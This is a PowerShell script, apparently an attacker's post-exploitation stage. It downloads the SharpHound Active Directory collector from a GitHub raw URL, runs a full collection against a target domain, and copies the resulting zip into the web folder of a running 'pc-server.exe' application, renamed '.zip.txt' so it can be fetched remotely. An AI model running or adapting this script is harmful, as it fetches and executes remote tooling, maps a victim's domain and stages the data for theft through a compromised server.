$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$tool = Join-Path $env:TEMP "SharpHound.exe"
$outDir = Join-Path $env:TEMP "bh"
$log = Join-Path $env:TEMP "sharphound.txt"

(New-Object Net.WebClient).DownloadFile("$root/SharpHound.exe", $tool)
New-Item -ItemType Directory -Path $outDir -Force | Out-Null
& $tool -c All -d $env:BH_DOMAIN --OutputDirectory $outDir 2>&1 |
    Tee-Object -FilePath $log
$zip = Get-ChildItem $outDir -Filter "*.zip" |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 1
if (-not $zip) {
    Write-Output "BH_ZIP_MISSING"
    Get-Content $log -Raw -ErrorAction SilentlyContinue
    exit 1
}

$pc = Get-CimInstance Win32_Process -Filter "Name='pc-server.exe'" |
    Select-Object -First 1
$pcWin = Split-Path $pc.ExecutablePath -Parent
$pcBin = Split-Path $pcWin -Parent
$pcHome = Split-Path $pcBin -Parent
$web = Join-Path $pcHome "custom\web"
$name = "sharphound_$($env:BH_DOMAIN.Replace('.', '_')).zip.txt"
Copy-Item $zip.FullName (Join-Path $web $name) -Force
Write-Output "BH_FILE=$name"
Write-Output "BH_SIZE=$($zip.Length)"
